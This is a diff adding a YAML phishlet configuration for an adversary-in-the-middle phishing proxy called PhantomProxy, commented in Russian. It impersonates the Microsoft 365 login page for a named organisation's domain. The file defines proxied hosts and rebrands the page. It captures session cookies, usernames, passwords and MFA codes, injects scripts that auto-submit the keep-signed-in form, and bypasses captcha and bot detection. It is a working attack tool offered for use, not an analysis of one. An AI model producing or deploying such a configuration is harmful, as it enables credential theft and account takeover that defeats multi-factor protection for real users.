@@ -1,0 +1,181 @@
+# Microsoft 365 Phishlet для verdebudget.ru
+# PhantomProxy v1.0.0
+
+author: '@phantom-proxy'
+min_ver: '1.0.0'
+
+# Хосты для проксирования
+proxy_hosts:
+  - phish_sub: ''
+    orig_sub: 'login'
+    domain: 'microsoftonline.com'
+    session: true
+    is_landing: true
+    auto_filter: true
+    
+  - phish_sub: 'api'
+    orig_sub: 'api'
+    domain: 'microsoft.com'
+    session: false
+    is_landing: false
+    
+  - phish_sub: 'www'
+    orig_sub: 'www'
+    domain: 'microsoft.com'
+    session: false
+    is_landing: false
+
+# Правила замены контента
+sub_filters:
+  - triggers_on: 'login.microsoftonline.com'
+    orig_sub: 'login'
+    domain: 'microsoftonline.com'
+    search: 'https://{hostname}/ppsecure/'
+    replace: 'https://{hostname}/ppsecure/'
+    mimes: ['text/html', 'application/json', 'application/javascript']
+    
+  - triggers_on: 'login.microsoftonline.com'
+    orig_sub: 'login'
+    domain: 'microsoftonline.com'
+    search: 'https://{hostname}'
+    replace: 'https://{hostname}'
+    mimes: ['text/html']
+    redirect_only: true
+    
+  - triggers_on: 'login.microsoftonline.com'
+    orig_sub: 'login'
+    domain: 'microsoftonline.com'
+    search: 'Microsoft Online'
+    replace: 'VerdeBudget Login'
+    mimes: ['text/html']
+
+# Токены аутентификации для перехвата
+auth_tokens:
+  - domain: '.microsoftonline.com'
+    keys:
+      - 'ESTSAUTH'
+      - 'ESTSAUTHPERSISTENT'
+      - 'SignInCookies'
+      - 'rtFa'
+      
+  - domain: '.microsoft.com'
+    keys:
+      - 'MSOAuth'
+      - 'msapp'
+
+# Конфигурация перехвата креденшалов
+credentials:
+  username:
+    key: 'login'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'passwd'
+    search: '(.*)'
+    type: 'post'
+  custom:
+    - key: 'mfa_code'
+      search: '([0-9]{6})'
+      type: 'post'
+
+# URLs успешной аутентификации
+auth_urls:
+  - '/common/oauth2/v2.0/authorize'
+  - '/common/oauth2/v2.0/token'
+  - '/kmsi'
+  - '/common/SAS/ProcessAuth.srf'
+
+# Страница входа
+login:
+  domain: 'login.microsoftonline.com'
+  path: '/common/oauth2/v2.0/authorize'
+
+# JavaScript инъекции
+js_inject:
+  - trigger_domains:
+      - 'login.microsoftonline.com'
+    trigger_paths:
+      - '/common/oauth2/v2.0/authorize'
+    trigger_params:
+      - 'email'
+    script: |
+      (function() {
+        console.log('[PhantomJS] Injected');
+        
+        // Перехват отправки формы
+        document.addEventListener('submit', function(e) {
+          var form = e.target;
+          if (form.tagName === 'FORM') {
+            console.log('[PhantomJS] Form submitted');
+            
+            // Добавляем client_id если нет
+            var clientIdField = form.querySelector('input[name="client_id"]');
+            if (!clientIdField) {
+              var hidden = document.createElement('input');
+              hidden.type = 'hidden';
+              hidden.name = 'client_id';
+              hidden.value = '00000002-0000-0000-c000-000000000000'; // Office 365
+              form.appendChild(hidden);
+            }
+          }
+        }, true);
+      })();
+
+  - trigger_domains:
+      - 'login.microsoftonline.com'
+    trigger_paths:
+      - '/kmsi'
+    trigger_params: []
+    script: |
+      (function() {
+        // Авто-отправка формы KMSI (Keep Me Signed In)
+        var kmsiForm = document.querySelector('form[name="kmsiForm"]');
+        if (kmsiForm) {
+          setTimeout(function() {
+            kmsiForm.submit();
+          }, 500);
+        }
+        
+        // Скрытие footer
+        var footer = document.querySelector('footer');
+        if (footer) {
+          footer.style.display = 'none';
+        }
+      })();
+
+  - trigger_domains:
+      - 'login.microsoftonline.com'
+    trigger_paths:
+      - '/common/SAS/ProcessAuth.srf'
+    trigger_params:
+      - 'mfa'
+    script: |
+      (function() {
+        // Автозаполнение MFA кода если есть параметр
+        var mfaField = document.querySelector('input[name="otc"]');
+        if (mfaField && "{mfa}" !== "") {
+          mfaField.value = "{mfa}";
+          mfaField.dispatchEvent(new Event('input', { bubbles: true }));
+        }
+      })();
+
+# Принудительные POST параметры
+force_post:
+  - path: '/common/oauth2/v2.0/token'
+    search:
+      - key: 'username'
+        search: '.*'
+      - key: 'password'
+        search: '.*'
+    force:
+      - key: 'rememberMe'
+        value: 'true'
+      - key: 'client_id'
+        value: '00000002-0000-0000-c000-000000000000'
+    type: 'post'
+
+# Обход защит
+evasion:
+  captcha_solver: 'playwright'
+  bot_detection_bypass: true
+  fingerprint_override: 'chrome_133'
